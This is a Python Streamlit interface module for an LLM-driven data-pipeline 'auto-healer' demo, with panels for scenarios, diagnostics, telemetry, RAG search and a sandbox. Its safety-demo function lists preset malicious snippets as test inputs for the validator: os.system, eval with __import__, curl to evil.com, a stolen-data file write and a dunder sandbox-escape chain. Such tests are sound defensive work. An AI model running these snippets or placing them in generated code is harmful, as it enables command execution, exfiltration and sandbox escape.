import streamlit as st
import pandas as pd
import json
from typing import Optional

STATUS_ICONS = {
    "success": "✅",
    "failure": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "running": "⏳",
    "healed": "✨",
    "blocked": "🚫",
}

STATUS_COLORS = {
    "success": "#28a745",
    "failure": "#dc3545",
    "warning": "#ffc107",
    "info": "#17a2b8",
}


def render_header() -> None:
    """Render the application header with title and description."""
    st.markdown(
        """
        <div style="text-align: center; padding: 1rem 0;">
            <h1 style="margin-bottom: 0.2rem;">🛠️ DataOps Auto-Healer</h1>
            <p style="color: #888; font-size: 1.1rem; margin-top: 0;">
                LLM-Driven Observability & Remediation Engine
            </p>
        </div>
        <hr style="margin: 0.5rem 0 1.5rem 0;">
        """,
        unsafe_allow_html=True,
    )


def render_sidebar_config() -> dict:
    """
    Render the sidebar configuration panel.

    Returns:
        Dict with user-selected configuration values.
    """
    with st.sidebar:
        st.markdown("## ⚙️ Configuration")
        st.markdown("---")

        # ── Scenario Selection ──
        st.markdown("### 🎯 Failure Scenario")
        scenario = st.selectbox(
            "Select a scenario to demonstrate:",
            options=["Schema Drift", "Missing Column", "Wrong Datatype"],
            index=0,
            help="Each scenario injects a different real-world data failure.",
        )

        # Scenario descriptions
        scenario_info = {
            "Schema Drift": {
                "icon": "🔄",
                "desc": "Upstream team renamed `customer_id` → `cust_id`",
                "impact": "Validation rejects unknown columns",
            },
            "Missing Column": {
                "icon": "🕳️",
                "desc": "Source API dropped the `email` column",
                "impact": "Pipeline fails on missing required column",
            },
            "Wrong Datatype": {
                "icon": "🔢",
                "desc": "`amount` column contains 'INVALID' and 'N/A'",
                "impact": "Type validation fails on non-numeric values",
            },
        }

        info = scenario_info[scenario]
        st.info(f"{info['icon']} **{scenario}**\n\n{info['desc']}\n\n"
                f"**Impact:** {info['impact']}")

        st.markdown("---")

        # ── Retry Configuration ──
        st.markdown("### 🔁 Retry Settings")
        max_retries = st.slider(
            "Max remediation attempts:",
            min_value=1,
            max_value=5,
            value=3,
            help="How many times the agent will attempt to fix the error.",
        )

        st.markdown("---")

        # ── System Status ──
        st.markdown("### 📡 System Status")
        agent_status = "🟢 Ready" if st.session_state.get("agent_initialized") else "🔴 Not initialized"
        st.markdown(f"**Agent:** {agent_status}")

        runs = st.session_state.get("total_scenarios_run", 0)
        healed = st.session_state.get("total_healed", 0)
        st.markdown(f"**Runs:** {runs} | **Healed:** {healed}")

        if runs > 0:
            rate = (healed / runs) * 100
            st.progress(rate / 100, text=f"{rate:.0f}% success rate")

        st.markdown("---")

        # ── Info Section ──
        st.markdown("### 📖 About")
        st.caption(
            "This project demonstrates autonomous data pipeline "
            "remediation using LLM agents, RAG memory, and safe "
            "code execution. Built for AI/ML placement preparation."
        )

    return {
        "scenario": scenario,
        "max_retries": max_retries,
    }


def render_dataframe_comparison(
    title_left: str,
    df_left: Optional[pd.DataFrame],
    title_right: str,
    df_right: Optional[pd.DataFrame],
) -> None:
    """
    Render two DataFrames side-by-side for comparison.

    Used to show before/after states:
      • Raw vs Corrupted
      • Corrupted vs Fixed
      • Fixed vs Final
    """
    col1, col2 = st.columns(2)

    with col1:
        st.markdown(f"**{title_left}**")
        if df_left is not None:
            st.dataframe(df_left, use_container_width=True, height=250)
            st.caption(f"{len(df_left)} rows × {len(df_left.columns)} cols")
        else:
            st.info("No data yet")

    with col2:
        st.markdown(f"**{title_right}**")
        if df_right is not None:
            st.dataframe(df_right, use_container_width=True, height=250)
            st.caption(f"{len(df_right)} rows × {len(df_right.columns)} cols")
        else:
            st.info("No data yet")



def render_step_trace(step_logs: list) -> None:
    """
    Render the step-by-step execution trace as a visual timeline.

    Each step is displayed as a colored card showing:
      • Step name with status icon
      • Detail description
      • Optional expandable data section
    """
    if not step_logs:
        st.info("Run a scenario to see the step-by-step trace here.")
        return

    for i, log in enumerate(step_logs):
        icon = STATUS_ICONS.get(log["status"], "▶️")
        color = STATUS_COLORS.get(log["status"], "#666")

        st.markdown(
            f"""
            <div style="
                border-left: 4px solid {color};
                padding: 0.6rem 1rem;
                margin: 0.4rem 0;
                background: rgba(0,0,0,0.03);
                border-radius: 0 6px 6px 0;
            ">
                <strong>{icon} Step {i + 1}: {log['step']}</strong><br>
                <span style="color: #666; font-size: 0.9rem;">{log['detail']}</span>
            </div>
            """,
            unsafe_allow_html=True,
        )

        if log.get("data"):
            with st.expander(f"📄 Details for Step {i + 1}", expanded=False):
                data = log["data"]
                if isinstance(data, pd.DataFrame):
                    st.dataframe(data, use_container_width=True)
                elif isinstance(data, dict):
                    st.json(data)
                elif isinstance(data, str):
                    st.code(data, language="python")
                else:
                    st.write(data)


def render_agent_diagnostics(
    error_context: Optional[dict],
    agent_result: Optional[dict],
    exec_result: Optional[dict],
    rag_results: Optional[list],
) -> None:
    """
    Render the LLM agent's diagnostic output in detail.

    Shows four expandable sections:
      1. Error that triggered the agent
      2. RAG retrieval results (similar past fixes)
      3. LLM-generated patch code
      4. Safe execution result
    """
    if not agent_result:
        st.info("Run a scenario to see agent diagnostics.")
        return

    # ── Error Context ──
    with st.expander("🔴 Error Context", expanded=True):
        if error_context:
            col1, col2 = st.columns(2)
            col1.metric("Error Type", error_context.get("error_type", "—"))
            col2.metric("Status", "FAILED")

            st.markdown("**Error Message:**")
            st.error(error_context.get("error_message", "No message"))

            if error_context.get("stack_trace"):
                st.markdown("**Stack Trace:**")
                trace = error_context["stack_trace"]
                if isinstance(trace, list):
                    trace = "".join(trace)
                st.code(trace, language="python")

    # ── RAG Retrieval ──
    with st.expander("📚 RAG Memory Retrieval", expanded=True):
        if rag_results:
            st.markdown(f"**Found {len(rag_results)} similar past errors:**")
            for r in rag_results:
                sim_color = "#28a745" if r["similarity_score"] > 0.8 else "#ffc107"
                st.markdown(
                    f"""
                    <div style="
                        border: 1px solid {sim_color};
                        border-radius: 8px;
                        padding: 0.8rem;
                        margin: 0.5rem 0;
                    ">
                        <strong>Rank {r['rank']}</strong> |
                        Similarity: <span style="color:{sim_color};
                            font-weight:bold;">{r['similarity_score']:.2f}</span> |
                        Source: <code>{r['source']}</code><br>
                        <strong>Type:</strong> {r['error_type']}<br>
                        <strong>Fix:</strong> {r['fix_description']}
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
                st.code(r["fix_code"], language="python")
        else:
            st.warning("No similar errors found in RAG memory.")

    with st.expander("🤖 LLM Generated Patch", expanded=True):
        col1, col2, col3 = st.columns(3)
        col1.metric("Latency", f"{agent_result.get('llm_latency_ms', 0):.0f}ms")
        col2.metric("Model", agent_result.get("model_used", "—"))
        col3.metric("Safe", "Yes ✓" if agent_result.get("is_safe") else "No ✗")

        patch = agent_result.get("generated_patch", "")
        st.markdown("**Generated Code:**")
        st.code(patch, language="python")

        if agent_result.get("was_sanitized"):
            st.warning("⚠️ Response was sanitized (markdown/comments stripped)")

        if agent_result.get("blocked_reasons"):
            st.error(f"🚫 Blocked: {', '.join(agent_result['blocked_reasons'])}")

    # ── Execution Result ──
    with st.expander("🛡️ Safe Execution Result", expanded=True):
        if exec_result:
            success = exec_result.get("success", False)
            if success:
                col1, col2 = st.columns(2)
                col1.metric("Execution", "✅ Success")
                col2.metric("Time", f"{exec_result.get('execution_time_ms', 0):.1f}ms")

                if exec_result.get("validation_passed") is not None:
                    st.success("Static analysis: all safety checks passed")
            else:
                st.error(f"Execution failed: {exec_result.get('error', 'Unknown')}")
                if exec_result.get("rejection_reasons"):
                    for reason in exec_result["rejection_reasons"]:
                        st.markdown(f"  🚫 {reason}")
        else:
            st.info("No execution attempted yet.")


def render_telemetry_dashboard(
    heal_history: list,
    latency_history: list,
) -> None:
    """
    Render aggregated telemetry metrics across all scenario runs.

    Shows:
      • KPI metrics (success rate, avg latency, total runs)
      • Per-scenario history table
      • LLM latency chart
    """
    if not heal_history:
        st.info("Run scenarios to see telemetry data.")
        return

    # ── KPI Row ──
    total = len(heal_history)
    healed = sum(1 for r in heal_history if r.get("healed"))
    failed = total - healed
    avg_latency = (
        sum(latency_history) / len(latency_history)
        if latency_history else 0
    )

    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total Runs", total)
    col2.metric("Healed", healed, delta=f"{(healed/total*100):.0f}%")
    col3.metric("Failed", failed)
    col4.metric("Avg LLM Latency", f"{avg_latency:.0f}ms")

    st.markdown("---")

    # ── History Table ──
    st.markdown("**📊 Run History**")

    history_data = []
    for r in heal_history:
        telemetry = r.get("telemetry", {})
        llm_stats = telemetry.get("llm_latency_stats", {})
        history_data.append({
            "Scenario": r.get("scenario", "—"),
            "Status": "✅ Healed" if r.get("healed") else "❌ Failed",
            "Attempts": r.get("attempts", 0),
            "Records": r.get("records_processed", 0),
            "Time (ms)": telemetry.get("total_healing_time_ms", 0),
            "LLM Latency": f"{llm_stats.get('avg_ms', 0):.0f}ms" if llm_stats else "—",
        })

    history_df = pd.DataFrame(history_data)
    st.dataframe(history_df, use_container_width=True, hide_index=True)

    # ── Latency Chart ──
    if len(latency_history) > 1:
        st.markdown("**📈 LLM Latency Over Time**")
        chart_df = pd.DataFrame({
            "Call #": range(1, len(latency_history) + 1),
            "Latency (ms)": latency_history,
        }).set_index("Call #")
        st.line_chart(chart_df, color="#6366f1")


def render_rag_explorer(store) -> None:
    """
    Render an interactive explorer for the ChromaDB knowledge base.

    Shows:
      • Collection statistics
      • All stored records with metadata
      • Interactive similarity search
    """
    if store is None:
        st.info("RAG store not initialized.")
        return

    # ── Collection Stats ──
    stats = store.get_collection_stats()
    col1, col2, col3 = st.columns(3)
    col1.metric("Total Records", stats["total_records"])
    col2.metric("Seed Fixes", stats["source_distribution"].get("seed", 0))
    col3.metric("Learned Fixes", stats["source_distribution"].get("auto_healer", 0))

    st.markdown("---")

    # ── Interactive Search ──
    st.markdown("**🔎 Similarity Search**")
    search_query = st.text_area(
        "Enter an error message to find similar past fixes:",
        value="KeyError: Missing required columns: ['email']",
        height=80,
    )

    if st.button("🔍 Search", key="rag_search"):
        if search_query.strip():
            results = store.query_similar_errors(search_query, top_k=5)

            if results:
                for r in results:
                    sim = r["similarity_score"]
                    sim_color = "#28a745" if sim > 0.8 else ("#ffc107" if sim > 0.6 else "#dc3545")

                    st.markdown(
                        f"""
                        <div style="
                            border: 1px solid #ddd;
                            border-radius: 8px;
                            padding: 1rem;
                            margin: 0.5rem 0;
                            border-left: 4px solid {sim_color};
                        ">
                            <strong>#{r['rank']}</strong> |
                            Similarity: <span style="color:{sim_color};
                                font-weight:bold;">{sim:.3f}</span> |
                            Type: <code>{r['error_type']}</code> |
                            Source: <code>{r['source']}</code><br>
                            <em>{r['fix_description']}</em>
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )
                    with st.expander(f"View fix code (Rank #{r['rank']})"):
                        st.code(r["fix_code"], language="python")
            else:
                st.warning("No similar errors found.")


def render_safety_demo(executor) -> None:
    """
    Interactive demo of the safe execution sandbox.

    Lets users type or select dangerous code samples and see
    how the executor blocks them — great for interviews.
    """
    st.markdown("**Try submitting code to the sandbox:**")

    # ── Preset examples ──
    preset = st.selectbox(
        "Select a preset (or write custom code below):",
        options=[
            "Custom",
            "✅ Safe: Column rename",
            "✅ Safe: Numeric coercion",
            "❌ Dangerous: import os",
            "❌ Dangerous: eval()",
            "❌ Dangerous: file write",
            "❌ Dangerous: subprocess",
            "❌ Dangerous: dunder access",
        ],
    )

    preset_code = {
        "Custom": "",
        "✅ Safe: Column rename": "df = df.rename(columns={'cust_id': 'customer_id'})",
        "✅ Safe: Numeric coercion": "df['amount'] = pd.to_numeric(df['amount'], errors='coerce').fillna(0.0)",
        "❌ Dangerous: import os": "import os\nos.system('echo pwned')",
        "❌ Dangerous: eval()": 'eval("__import__(\'os\').system(\'ls\')")',
        "❌ Dangerous: file write": "df.to_csv('/tmp/stolen_data.csv')",
        "❌ Dangerous: subprocess": "subprocess.run(['curl', 'http://evil.com'])",
        "❌ Dangerous: dunder access": "df.__class__.__bases__[0].__subclasses__()",
    }

    code_input = st.text_area(
        "Code to execute:",
        value=preset_code.get(preset, ""),
        height=100,
        key="safety_code_input",
    )

    if st.button("🛡️ Validate & Execute", key="safety_exec"):
        if not code_input.strip():
            st.warning("Enter some code first.")
            return

        # Create a test DataFrame
        test_df = pd.DataFrame({
            "cust_id": [101, 102, 103],
            "name": ["Alice", "Bob", "Charlie"],
            "amount": ["150.0", "INVALID", "89.99"],
        })

        # Show validation result
        validation = executor.validate(code_input)

        if validation["is_valid"]:
            st.success("✅ Static analysis PASSED — code is safe to execute")

            result = executor.execute(code_input, test_df)

            if result["success"]:
                st.success(f"✅ Execution succeeded ({result['execution_time_ms']}ms)")
                st.markdown("**Result DataFrame:**")
                st.dataframe(result["modified_df"], use_container_width=True)
            else:
                st.error(f"❌ Runtime error: {result['error']}")
        else:
            st.error("🚫 Code REJECTED by static analysis")
            for reason in validation["rejection_reasons"]:
                st.markdown(f"  • {reason}")